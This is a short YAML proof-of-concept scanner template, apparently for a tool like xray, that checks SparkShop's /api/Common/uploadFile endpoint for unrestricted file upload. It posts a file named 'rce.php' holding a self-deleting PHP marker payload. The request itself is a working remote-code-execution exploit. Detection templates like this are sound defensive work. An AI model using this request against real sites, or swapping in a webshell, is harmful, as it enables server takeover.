name: poc-yaml-SparkShop-uploadFile-File-upload
transport: http


rules:
  r0:
    request:
      method: POST
      path: /api/Common/uploadFile
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
      body: 
       "--d0b7a0d40eed0e32904c8017b09eb305\r\n\
        Content-Disposition: form-data; name=\"file\";filename=\"rce.php\"\r\n\
        \r\n\
        <?php print(111*222);unlink(__FILE__);?>\r\n\
        --d0b7a0d40eed0e32904c8017b09eb305--\r\n\
        "
    expression: response.status == 200 && response.body.bcontains(b'upload success')
expression: r0()

